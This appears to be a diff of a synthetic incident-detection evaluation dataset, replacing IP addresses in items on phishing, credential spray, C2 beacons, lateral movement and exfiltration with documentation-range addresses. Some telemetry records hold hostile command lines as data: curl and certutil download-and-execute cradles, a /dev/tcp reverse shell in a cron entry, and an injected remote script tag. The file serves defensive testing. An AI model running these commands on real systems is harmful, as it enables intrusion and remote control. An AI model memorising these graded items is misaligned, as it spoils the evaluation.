@@ -4,7 +4,7 @@
     "template_id": "phishing-macro-email",
     "template_index": 0,
     "title": "Spear-phishing email with macro-laden attachment delivered to dave@example.com",
-    "description": "Inbound email from 45.142.122.111 delivered an Office document with a malicious VBA macro to dave@example.com. Attachment opened on WIN-DC-PRIMARY; macro spawned cmd.exe and downloaded a stage-2 payload from a known Lazarus infrastructure.",
+    "description": "Inbound email from 203.0.113.111 delivered an Office document with a malicious VBA macro to dave@example.com. Attachment opened on WIN-DC-PRIMARY; macro spawned cmd.exe and downloaded a stage-2 payload from a known Lazarus infrastructure.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -18,7 +18,7 @@
     "evidence_keywords": [
       "phishing email",
       "macro",
-      "45.142.122.111",
+      "203.0.113.111",
       "WIN-DC-PRIMARY",
       "dave@example.com",
       "stage-2 payload"
@@ -29,7 +29,7 @@
         "Workload": "Exchange",
         "Operation": "Send",
         "UserId": "dave@example.com",
-        "ClientIP": "45.142.122.111",
+        "ClientIP": "203.0.113.111",
         "Subject": "Q4 invoice (action required)",
         "AttachmentNames": [
           "invoice_q4.docm"
@@ -254,7 +254,7 @@
     "template_id": "oauth-consent-phish",
     "template_index": 5,
     "title": "OAuth consent phishing targeting ceo@example.com",
-    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 91.134.231.15.",
+    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 192.0.2.15.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -270,7 +270,7 @@
       "Mail.Read",
       "Files.Read.All",
       "ceo@example.com",
-      "91.134.231.15",
+      "192.0.2.15",
       "forwarding rule"
     ],
     "telemetry": [
@@ -293,7 +293,7 @@
         "UserId": "ceo@example.com",
         "Parameters": {
           "Name": "Auto-fwd",
-          "ForwardTo": "ext@91.134.231.15",
+          "ForwardTo": "ext@192.0.2.15",
           "DeleteMessage": true
         }
       }
@@ -1035,8 +1035,8 @@
     "id": "INC-EVAL-022",
     "template_id": "credential-spray",
     "template_index": 21,
-    "title": "Brute-force credential spray against svc-deploy@example.com from 45.142.122.111",
-    "description": "Credential spray from 45.142.122.111 against svc-deploy@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
+    "title": "Brute-force credential spray against svc-deploy@example.com from 203.0.113.111",
+    "description": "Credential spray from 203.0.113.111 against svc-deploy@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
     "expected_tactics": [
       "TA0006"
     ],
@@ -1049,7 +1049,7 @@
       "brute force",
       "credential spray",
       "svc-deploy@example.com",
-      "45.142.122.111",
+      "203.0.113.111",
       "azure ad"
     ],
     "telemetry": [
@@ -1057,7 +1057,7 @@
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "svc-deploy@example.com",
-        "ipAddress": "45.142.122.111",
+        "ipAddress": "203.0.113.111",
         "resultType": 50126,
         "resultDescription": "Invalid username or password",
         "appDisplayName": "Office 365 Exchange Online",
@@ -1067,7 +1067,7 @@
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "svc-deploy@example.com",
-        "ipAddress": "45.142.122.111",
+        "ipAddress": "203.0.113.111",
         "resultType": 0,
         "resultDescription": "Success",
         "conditionalAccessStatus": "success",
@@ -1398,7 +1398,7 @@
     "template_id": "wmi-lateral-execution",
     "template_index": 29,
     "title": "WMI lateral execution from WIN-PROD-WEB02 to AWS-EC2-PROD-API",
-    "description": "wmic.exe /node:AWS-EC2-PROD-API process call create observed from WIN-PROD-WEB02 by dave@example.com. Remote command execution; payload from 91.134.231.15.",
+    "description": "wmic.exe /node:AWS-EC2-PROD-API process call create observed from WIN-PROD-WEB02 by dave@example.com. Remote command execution; payload from 192.0.2.15.",
     "expected_tactics": [
       "TA0008",
       "TA0002"
@@ -1414,7 +1414,7 @@
       "WIN-PROD-WEB02",
       "AWS-EC2-PROD-API",
       "dave@example.com",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -1425,7 +1425,7 @@
         "Computer": "WIN-PROD-WEB02",
         "User": "dave@example.com",
         "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
-        "CommandLine": "wmic /node:AWS-EC2-PROD-API process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
+        "CommandLine": "wmic /node:AWS-EC2-PROD-API process call create \"cmd /c curl http://192.0.2.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
       }
     ]
   },
@@ -1550,7 +1550,7 @@
     "template_id": "s3-exfil-cloud-storage",
     "template_index": 33,
     "title": "Cloud storage exfil: data egress to attacker-controlled S3 from WIN-DC-PRIMARY",
-    "description": "Egress from WIN-DC-PRIMARY to s3://atk-stage-91.134.231.15/dump/ by carol@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
+    "description": "Egress from WIN-DC-PRIMARY to s3://atk-stage-192.0.2.15/dump/ by carol@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
     "expected_tactics": [
       "TA0010"
     ],
@@ -1565,7 +1565,7 @@
       "egress",
       "exfiltrat",
       "WIN-DC-PRIMARY",
-      "91.134.231.15",
+      "192.0.2.15",
       "carol@example.com"
     ],
     "telemetry": [
@@ -1580,12 +1580,12 @@
         },
         "sourceIPAddress": "WIN-DC-PRIMARY",
         "requestParameters": {
-          "bucketName": "atk-stage-91.134.231.15",
+          "bucketName": "atk-stage-192.0.2.15",
           "key": "dump/customers.tar.gz"
         },
         "resources": [
           {
-            "ARN": "arn:aws:s3:::atk-stage-91.134.231.15/dump/customers.tar.gz"
+            "ARN": "arn:aws:s3:::atk-stage-192.0.2.15/dump/customers.tar.gz"
           }
         ]
       }
@@ -1909,7 +1909,7 @@
     "template_id": "azure-ad-impossible-travel",
     "template_index": 41,
     "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for grace@example.com",
-    "description": "Successful Azure AD sign-in for grace@example.com from 45.142.122.111 (impossible-travel from prior location). MFA satisfied via stolen session token.",
+    "description": "Successful Azure AD sign-in for grace@example.com from 203.0.113.111 (impossible-travel from prior location). MFA satisfied via stolen session token.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -1926,14 +1926,14 @@
       "session token",
       "mfa",
       "grace@example.com",
-      "45.142.122.111"
+      "203.0.113.111"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "grace@example.com",
-        "ipAddress": "45.142.122.111",
+        "ipAddress": "203.0.113.111",
         "location": {
           "city": "Vladivostok",
           "countryOrRegion": "RU"
@@ -2030,7 +2030,7 @@
     "template_id": "office-vsto-addin",
     "template_index": 44,
     "title": "Malicious Office add-in installed for grace@example.com",
-    "description": "Office VSTO add-in registered under HKCU for grace@example.com on WIN-EXCHANGE-01; loads on every Outlook startup; beacons to 185.220.101.7.",
+    "description": "Office VSTO add-in registered under HKCU for grace@example.com on WIN-EXCHANGE-01; loads on every Outlook startup; beacons to 198.51.100.7.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -2047,7 +2047,7 @@
       "outlook",
       "grace@example.com",
       "WIN-EXCHANGE-01",
-      "185.220.101.7"
+      "198.51.100.7"
     ],
     "telemetry": [
       {
@@ -2068,7 +2068,7 @@
         "EventID": 3,
         "Computer": "WIN-EXCHANGE-01",
         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
-        "DestinationIp": "185.220.101.7",
+        "DestinationIp": "198.51.100.7",
         "DestinationPort": 443
       }
     ]
@@ -2077,8 +2077,8 @@
     "id": "INC-EVAL-046",
     "template_id": "github-pat-leak",
     "template_index": 45,
-    "title": "GitHub PAT leaked and abused from 185.220.101.7",
-    "description": "Personal access token belonging to grace@example.com used from 185.220.101.7 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
+    "title": "GitHub PAT leaked and abused from 198.51.100.7",
+    "description": "Personal access token belonging to grace@example.com used from 198.51.100.7 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
     "expected_tactics": [
       "TA0006",
       "TA0009"
@@ -2095,14 +2095,14 @@
       "token",
       "private repo",
       "grace@example.com",
-      "185.220.101.7"
+      "198.51.100.7"
     ],
     "telemetry": [
       {
         "source": "github_audit",
         "action": "git.clone",
         "actor": "grace@example.com",
-        "actor_ip": "185.220.101.7",
+        "actor_ip": "198.51.100.7",
         "repo_count": 14,
         "programmatic_access_type": "personal_access_token",
         "user_agent": "git/2.40.0"
@@ -2171,7 +2171,7 @@
     "template_id": "helpdesk-password-reset-abuse",
     "template_index": 47,
     "title": "Vendor admin password reset abuse for ops-lead@example.com",
-    "description": "Password reset for ops-lead@example.com performed by helpdesk in response to social-engineering call from 185.220.101.7. Token claimed within 90 seconds.",
+    "description": "Password reset for ops-lead@example.com performed by helpdesk in response to social-engineering call from 198.51.100.7. Token claimed within 90 seconds.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -2187,7 +2187,7 @@
       "social engineering",
       "helpdesk",
       "ops-lead@example.com",
-      "185.220.101.7"
+      "198.51.100.7"
     ],
     "telemetry": [
       {
@@ -2202,7 +2202,7 @@
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "ops-lead@example.com",
-        "ipAddress": "185.220.101.7",
+        "ipAddress": "198.51.100.7",
         "resultType": 0,
         "seconds_after_reset": 87
       }
@@ -2861,7 +2861,7 @@
     "template_id": "certutil-download-cradle",
     "template_index": 7,
     "title": "Living-off-the-land: certutil download cradle on WIN-PROD-WEB02",
-    "description": "certutil.exe -urlcache invoked from cmd.exe on WIN-PROD-WEB02. cmd.exe was spawned by outlook.exe. Payload downloaded from 91.134.231.15.",
+    "description": "certutil.exe -urlcache invoked from cmd.exe on WIN-PROD-WEB02. cmd.exe was spawned by outlook.exe. Payload downloaded from 192.0.2.15.",
     "expected_tactics": [
       "TA0002",
       "TA0005"
@@ -2877,7 +2877,7 @@
       "urlcache",
       "outlook.exe",
       "WIN-PROD-WEB02",
-      "91.134.231.15",
+      "192.0.2.15",
       "download cradle"
     ],
     "telemetry": [
@@ -2889,7 +2889,7 @@
         "Computer": "WIN-PROD-WEB02",
         "Image": "C:\\Windows\\System32\\certutil.exe",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "CommandLine": "certutil -urlcache -split -f http://91.134.231.15/p.exe %TEMP%\\p.exe"
+        "CommandLine": "certutil -urlcache -split -f http://192.0.2.15/p.exe %TEMP%\\p.exe"
       },
       {
         "source": "sysmon",
@@ -2898,7 +2898,7 @@
         "EventID": 3,
         "Computer": "WIN-PROD-WEB02",
         "Image": "C:\\Windows\\System32\\certutil.exe",
-        "DestinationIp": "91.134.231.15",
+        "DestinationIp": "192.0.2.15",
         "DestinationPort": 80,
         "Protocol": "tcp"
       }
@@ -3143,7 +3143,7 @@
     "template_id": "cron-backdoor",
     "template_index": 13,
     "title": "Backdoor cron job installed on LIN-DB-REPLICA",
-    "description": "/etc/cron.d entry created by ceo@example.com on LIN-DB-REPLICA. Reverse shell beacon to 45.142.122.111 every 5 minutes.",
+    "description": "/etc/cron.d entry created by ceo@example.com on LIN-DB-REPLICA. Reverse shell beacon to 203.0.113.111 every 5 minutes.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -3160,7 +3160,7 @@
       "reverse shell",
       "LIN-DB-REPLICA",
       "ceo@example.com",
-      "45.142.122.111"
+      "203.0.113.111"
     ],
     "telemetry": [
       {
@@ -3176,7 +3176,7 @@
       {
         "source": "linux_journald",
         "_SYSTEMD_UNIT": "cron.service",
-        "MESSAGE": "(root) CMD (/bin/bash -i >& /dev/tcp/45.142.122.111/4444 0>&1)",
+        "MESSAGE": "(root) CMD (/bin/bash -i >& /dev/tcp/203.0.113.111/4444 0>&1)",
         "hostname": "LIN-DB-REPLICA"
       }
     ]
@@ -3345,7 +3345,7 @@
     "template_id": "process-hollowing-svchost",
     "template_index": 17,
     "title": "Memory-only fileless implant in svchost on LIN-EDGE-VPN02",
-    "description": "Process hollowing detected on LIN-EDGE-VPN02: svchost.exe replaced with Cobalt Strike beacon to 45.142.122.111. No disk artefacts. Linked to LockBit 3.0.",
+    "description": "Process hollowing detected on LIN-EDGE-VPN02: svchost.exe replaced with Cobalt Strike beacon to 203.0.113.111. No disk artefacts. Linked to LockBit 3.0.",
     "expected_tactics": [
       "TA0002",
       "TA0005"
@@ -3362,7 +3362,7 @@
       "svchost",
       "Cobalt Strike",
       "LIN-EDGE-VPN02",
-      "45.142.122.111"
+      "203.0.113.111"
     ],
     "telemetry": [
       {
@@ -3383,7 +3383,7 @@
         "EventID": 3,
         "Computer": "LIN-EDGE-VPN02",
         "Image": "C:\\Windows\\System32\\svchost.exe",
-        "DestinationIp": "45.142.122.111",
+        "DestinationIp": "203.0.113.111",
         "DestinationPort": 443,
         "Protocol": "tcp",
         "ja3": "a0e9f5d64349fb13191bc781f81f42e1"
@@ -3907,7 +3907,7 @@
     "template_id": "wmi-lateral-execution",
     "template_index": 29,
     "title": "WMI lateral execution from WIN-FILE-SHARE to MAC-CFO-LAPTOP",
-    "description": "wmic.exe /node:MAC-CFO-LAPTOP process call create observed from WIN-FILE-SHARE by svc-backup@example.com. Remote command execution; payload from 91.134.231.15.",
+    "description": "wmic.exe /node:MAC-CFO-LAPTOP process call create observed from WIN-FILE-SHARE by svc-backup@example.com. Remote command execution; payload from 192.0.2.15.",
     "expected_tactics": [
       "TA0008",
       "TA0002"
@@ -3923,7 +3923,7 @@
       "WIN-FILE-SHARE",
       "MAC-CFO-LAPTOP",
       "svc-backup@example.com",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -3934,7 +3934,7 @@
         "Computer": "WIN-FILE-SHARE",
         "User": "svc-backup@example.com",
         "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
-        "CommandLine": "wmic /node:MAC-CFO-LAPTOP process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
+        "CommandLine": "wmic /node:MAC-CFO-LAPTOP process call create \"cmd /c curl http://192.0.2.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
       }
     ]
   },
@@ -4023,7 +4023,7 @@
     "template_id": "dns-tunnel-exfil",
     "template_index": 32,
     "title": "DNS tunnelling exfiltration from WIN-DC-SECONDARY",
-    "description": "DNS query volume from WIN-DC-SECONDARY 50\u00d7 baseline. TXT records contain base64-encoded payloads. Estimated exfil ~200 MB; destination 185.220.101.7.",
+    "description": "DNS query volume from WIN-DC-SECONDARY 50\u00d7 baseline. TXT records contain base64-encoded payloads. Estimated exfil ~200 MB; destination 198.51.100.7.",
     "expected_tactics": [
       "TA0011",
       "TA0010"
@@ -4040,15 +4040,15 @@
       "base64",
       "exfiltrat",
       "WIN-DC-SECONDARY",
-      "185.220.101.7"
+      "198.51.100.7"
     ],
     "telemetry": [
       {
         "source": "dns",
-        "query_name": "aGVsbG8gd29ybGQK.exfil.185.220.101.7.in-addr.arpa",
+        "query_name": "aGVsbG8gd29ybGQK.exfil.198.51.100.7.in-addr.arpa",
         "query_type": "TXT",
         "src_host": "WIN-DC-SECONDARY",
-        "dst_ip": "185.220.101.7",
+        "dst_ip": "198.51.100.7",
         "response_size": 512,
         "qps": 240
       }
@@ -4143,7 +4143,7 @@
     "template_id": "dga-c2",
     "template_index": 35,
     "title": "DGA-based C2 traffic from GCP-GKE-NODE-04",
-    "description": "DGA traffic from GCP-GKE-NODE-04 observed; 200+ NXDomain replies/min, IoCs match Volt Typhoon epoch 5. Beacons to 45.142.122.111.",
+    "description": "DGA traffic from GCP-GKE-NODE-04 observed; 200+ NXDomain replies/min, IoCs match Volt Typhoon epoch 5. Beacons to 203.0.113.111.",
     "expected_tactics": [
       "TA0011"
     ],
@@ -4158,7 +4158,7 @@
       "nxdomain",
       "beacon",
       "GCP-GKE-NODE-04",
-      "45.142.122.111",
+      "203.0.113.111",
       "Volt Typhoon"
     ],
     "telemetry": [
@@ -4177,7 +4177,7 @@
         "EventID": 3,
         "Computer": "GCP-GKE-NODE-04",
         "Image": "C:\\Windows\\System32\\svchost.exe",
-        "DestinationIp": "45.142.122.111",
+        "DestinationIp": "203.0.113.111",
         "DestinationPort": 443,
         "Protocol": "tcp",
         "threat_actor": "Volt Typhoon"
@@ -4188,8 +4188,8 @@
     "id": "INC-EVAL-092",
     "template_id": "https-c2-beacon",
     "template_index": 36,
-    "title": "HTTPS C2 beacon from LIN-BUILD-CI03 to 91.134.231.15",
-    "description": "Periodic HTTPS beacon from LIN-BUILD-CI03 to 91.134.231.15 every 60 seconds with low jitter. JA3 fingerprint matches Cobalt Strike.",
+    "title": "HTTPS C2 beacon from LIN-BUILD-CI03 to 192.0.2.15",
+    "description": "Periodic HTTPS beacon from LIN-BUILD-CI03 to 192.0.2.15 every 60 seconds with low jitter. JA3 fingerprint matches Cobalt Strike.",
     "expected_tactics": [
       "TA0011"
     ],
@@ -4204,7 +4204,7 @@
       "ja3",
       "Cobalt Strike",
       "LIN-BUILD-CI03",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -4213,7 +4213,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 3,
         "Computer": "LIN-BUILD-CI03",
-        "DestinationIp": "91.134.231.15",
+        "DestinationIp": "192.0.2.15",
         "DestinationPort": 443,
         "Protocol": "tcp",
         "ja3": "a0e9f5d64349fb13191bc781f81f42e1",
@@ -4357,7 +4357,7 @@
     "template_id": "public-s3-bucket-pii",
     "template_index": 40,
     "title": "Public S3 bucket exposing PII",
-    "description": "S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external enumeration from 91.134.231.15.",
+    "description": "S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external enumeration from 192.0.2.15.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -4373,7 +4373,7 @@
       "public bucket",
       "pii",
       "cloudtrail",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -4402,7 +4402,7 @@
         "eventName": "ListObjectsV2",
         "eventSource": "s3.amazonaws.com",
         "awsRegion": "us-east-1",
-        "sourceIPAddress": "91.134.231.15",
+        "sourceIPAddress": "192.0.2.15",
         "requestParameters": {
           "bucketName": "aisoc-employees",
           "max-keys": 1000
@@ -4586,8 +4586,8 @@
     "id": "INC-EVAL-101",
     "template_id": "github-pat-leak",
     "template_index": 45,
-    "title": "GitHub PAT leaked and abused from 45.142.122.111",
-    "description": "Personal access token belonging to admin@example.com used from 45.142.122.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
+    "title": "GitHub PAT leaked and abused from 203.0.113.111",
+    "description": "Personal access token belonging to admin@example.com used from 203.0.113.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
     "expected_tactics": [
       "TA0006",
       "TA0009"
@@ -4604,14 +4604,14 @@
       "token",
       "private repo",
       "admin@example.com",
-      "45.142.122.111"
+      "203.0.113.111"
     ],
     "telemetry": [
       {
         "source": "github_audit",
         "action": "git.clone",
         "actor": "admin@example.com",
-        "actor_ip": "45.142.122.111",
+        "actor_ip": "203.0.113.111",
         "repo_count": 14,
         "programmatic_access_type": "personal_access_token",
         "user_agent": "git/2.40.0"
@@ -4680,7 +4680,7 @@
     "template_id": "helpdesk-password-reset-abuse",
     "template_index": 47,
     "title": "Vendor admin password reset abuse for heidi@example.com",
-    "description": "Password reset for heidi@example.com performed by helpdesk in response to social-engineering call from 185.220.101.7. Token claimed within 90 seconds.",
+    "description": "Password reset for heidi@example.com performed by helpdesk in response to social-engineering call from 198.51.100.7. Token claimed within 90 seconds.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -4696,7 +4696,7 @@
       "social engineering",
       "helpdesk",
       "heidi@example.com",
-      "185.220.101.7"
+      "198.51.100.7"
     ],
     "telemetry": [
       {
@@ -4711,7 +4711,7 @@
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "heidi@example.com",
-        "ipAddress": "185.220.101.7",
+        "ipAddress": "198.51.100.7",
         "resultType": 0,
         "seconds_after_reset": 87
       }
@@ -4722,7 +4722,7 @@
     "template_id": "oauth-refresh-token-theft",
     "template_index": 48,
     "title": "OAuth refresh-token theft for alice@example.com",
-    "description": "Refresh token for alice@example.com replayed from 91.134.231.15. Granted access to mailbox + OneDrive without re-prompt.",
+    "description": "Refresh token for alice@example.com replayed from 192.0.2.15. Granted access to mailbox + OneDrive without re-prompt.",
     "expected_tactics": [
       "TA0006"
     ],
@@ -4738,14 +4738,14 @@
       "onedrive",
       "mailbox",
       "alice@example.com",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "alice@example.com",
-        "ipAddress": "91.134.231.15",
+        "ipAddress": "192.0.2.15",
         "resultType": 0,
         "authenticationProtocol": "oAuth2",
         "grantType": "refresh_token",
@@ -5124,8 +5124,8 @@
     "id": "INC-EVAL-113",
     "template_id": "confluence-watering-hole",
     "template_index": 2,
-    "title": "Watering-hole exploit served from internal Confluence by 185.220.101.7",
-    "description": "Internal Confluence page injected with malicious JavaScript by 185.220.101.7. Drive-by exploit triggered browser exploitation on multiple visitors including admin@example.com. Linked to MagicWeb TTPs.",
+    "title": "Watering-hole exploit served from internal Confluence by 198.51.100.7",
+    "description": "Internal Confluence page injected with malicious JavaScript by 198.51.100.7. Drive-by exploit triggered browser exploitation on multiple visitors including admin@example.com. Linked to MagicWeb TTPs.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -5140,7 +5140,7 @@
       "watering hole",
       "drive-by",
       "Confluence",
-      "185.220.101.7",
+      "198.51.100.7",
       "admin@example.com",
       "MagicWeb"
     ],
@@ -5150,9 +5150,9 @@
         "http_method": "POST",
         "url": "https://confluence.example.com/pages/editpage.action?pageId=8472",
         "status_code": 200,
-        "src_ip": "185.220.101.7",
+        "src_ip": "198.51.100.7",
         "user_agent": "Mozilla/5.0",
-        "payload_excerpt": "<script src=//185.220.101.7/x.js></script>"
+        "payload_excerpt": "<script src=//198.51.100.7/x.js></script>"
       },
       {
         "source": "edr",
@@ -5272,7 +5272,7 @@
     "template_id": "oauth-consent-phish",
     "template_index": 5,
     "title": "OAuth consent phishing targeting eve@example.com",
-    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by eve@example.com. Inbox forwarding rule created sending mail to 91.134.231.15.",
+    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by eve@example.com. Inbox forwarding rule created sending mail to 192.0.2.15.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -5288,7 +5288,7 @@
       "Mail.Read",
       "Files.Read.All",
       "eve@example.com",
-      "91.134.231.15",
+      "192.0.2.15",
       "forwarding rule"
     ],
     "telemetry": [
@@ -5311,7 +5311,7 @@
         "UserId": "eve@example.com",
         "Parameters": {
           "Name": "Auto-fwd",
-          "ForwardTo": "ext@91.134.231.15",
+          "ForwardTo": "ext@192.0.2.15",
           "DeleteMessage": true
         }
       }
@@ -5418,7 +5418,7 @@
     "template_id": "docker-runtime-abuse",
     "template_index": 8,
     "title": "Container runtime abuse: malicious `docker run` on WIN-FILE-SHARE",
-    "description": "Unauthenticated Docker API on WIN-FILE-SHARE exploited from 185.220.101.7. Container with cryptominer spawned. CPU on host saturated to 95%.",
+    "description": "Unauthenticated Docker API on WIN-FILE-SHARE exploited from 198.51.100.7. Container with cryptominer spawned. CPU on host saturated to 95%.",
     "expected_tactics": [
       "TA0002",
       "TA0001",
@@ -5437,7 +5437,7 @@
       "cryptominer",
       "miner",
       "WIN-FILE-SHARE",
-      "185.220.101.7"
+      "198.51.100.7"
     ],
     "telemetry": [
       {
@@ -5445,7 +5445,7 @@
         "http_method": "POST",
         "url": "http://WIN-FILE-SHARE:2375/containers/create",
         "status_code": 201,
-        "src_ip": "185.220.101.7",
+        "src_ip": "198.51.100.7",
         "request_body": {
           "Image": "monero/xmrig",
           "HostConfig": {
@@ -5652,7 +5652,7 @@
     "template_id": "cron-backdoor",
     "template_index": 13,
     "title": "Backdoor cron job installed on MAC-LEGAL-LAPTOP",
-    "description": "/etc/cron.d entry created by alice@example.com on MAC-LEGAL-LAPTOP. Reverse shell beacon to 91.134.231.15 every 5 minutes.",
+    "description": "/etc/cron.d entry created by alice@example.com on MAC-LEGAL-LAPTOP. Reverse shell beacon to 192.0.2.15 every 5 minutes.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -5669,7 +5669,7 @@
       "reverse shell",
       "MAC-LEGAL-LAPTOP",
       "alice@example.com",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -5685,7 +5685,7 @@
       {
         "source": "linux_journald",
         "_SYSTEMD_UNIT": "cron.service",
-        "MESSAGE": "(root) CMD (/bin/bash -i >& /dev/tcp/91.134.231.15/4444 0>&1)",
+        "MESSAGE": "(root) CMD (/bin/bash -i >& /dev/tcp/192.0.2.15/4444 0>&1)",
         "hostname": "MAC-LEGAL-LAPTOP"
       }
     ]
@@ -5854,7 +5854,7 @@
     "template_id": "process-hollowing-svchost",
     "template_index": 17,
     "title": "Memory-only fileless implant in svchost on GCP-GKE-NODE-04",
-    "description": "Process hollowing detected on GCP-GKE-NODE-04: svchost.exe replaced with Cobalt Strike beacon to 91.134.231.15. No disk artefacts. Linked to ALPHV/BlackCat.",
+    "description": "Process hollowing detected on GCP-GKE-NODE-04: svchost.exe replaced with Cobalt Strike beacon to 192.0.2.15. No disk artefacts. Linked to ALPHV/BlackCat.",
     "expected_tactics": [
       "TA0002",
       "TA0005"
@@ -5871,7 +5871,7 @@
       "svchost",
       "Cobalt Strike",
       "GCP-GKE-NODE-04",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -5892,7 +5892,7 @@
         "EventID": 3,
         "Computer": "GCP-GKE-NODE-04",
         "Image": "C:\\Windows\\System32\\svchost.exe",
-        "DestinationIp": "91.134.231.15",
+        "DestinationIp": "192.0.2.15",
         "DestinationPort": 443,
         "Protocol": "tcp",
         "ja3": "a0e9f5d64349fb13191bc781f81f42e1"
@@ -6053,8 +6053,8 @@
     "id": "INC-EVAL-132",
     "template_id": "credential-spray",
     "template_index": 21,
-    "title": "Brute-force credential spray against cfo@example.com from 91.134.231.15",
-    "description": "Credential spray from 91.134.231.15 against cfo@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
+    "title": "Brute-force credential spray against cfo@example.com from 192.0.2.15",
+    "description": "Credential spray from 192.0.2.15 against cfo@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
     "expected_tactics": [
       "TA0006"
     ],
@@ -6067,7 +6067,7 @@
       "brute force",
       "credential spray",
       "cfo@example.com",
-      "91.134.231.15",
+      "192.0.2.15",
       "azure ad"
     ],
     "telemetry": [
@@ -6075,7 +6075,7 @@
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "cfo@example.com",
-        "ipAddress": "91.134.231.15",
+        "ipAddress": "192.0.2.15",
         "resultType": 50126,
         "resultDescription": "Invalid username or password",
         "appDisplayName": "Office 365 Exchange Online",
@@ -6085,7 +6085,7 @@
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "cfo@example.com",
-        "ipAddress": "91.134.231.15",
+        "ipAddress": "192.0.2.15",
         "resultType": 0,
         "resultDescription": "Success",
         "conditionalAccessStatus": "success",
@@ -6185,7 +6185,7 @@
     "template_id": "saml-golden-ticket",
     "template_index": 24,
     "title": "SAML golden-ticket: forged assertion targeting svc-deploy@example.com",
-    "description": "Forged SAML assertion detected for svc-deploy@example.com. Attacker pivoted to Azure AD; account enumeration followed from 45.142.122.111.",
+    "description": "Forged SAML assertion detected for svc-deploy@example.com. Attacker pivoted to Azure AD; account enumeration followed from 203.0.113.111.",
     "expected_tactics": [
       "TA0006",
       "TA0007"
@@ -6202,14 +6202,14 @@
       "forged",
       "azure ad",
       "svc-deploy@example.com",
-      "45.142.122.111"
+      "203.0.113.111"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "svc-deploy@example.com",
-        "ipAddress": "45.142.122.111",
+        "ipAddress": "203.0.113.111",
         "resultType": 0,
         "authenticationDetails": [
           {
@@ -6416,7 +6416,7 @@
     "template_id": "wmi-lateral-execution",
     "template_index": 29,
     "title": "WMI lateral execution from MAC-CFO-LAPTOP to MAC-LEGAL-LAPTOP",
-    "description": "wmic.exe /node:MAC-LEGAL-LAPTOP process call create observed from MAC-CFO-LAPTOP by ceo@example.com. Remote command execution; payload from 91.134.231.15.",
+    "description": "wmic.exe /node:MAC-LEGAL-LAPTOP process call create observed from MAC-CFO-LAPTOP by ceo@example.com. Remote command execution; payload from 192.0.2.15.",
     "expected_tactics": [
       "TA0008",
       "TA0002"
@@ -6432,7 +6432,7 @@
       "MAC-CFO-LAPTOP",
       "MAC-LEGAL-LAPTOP",
       "ceo@example.com",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -6443,7 +6443,7 @@
         "Computer": "MAC-CFO-LAPTOP",
         "User": "ceo@example.com",
         "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
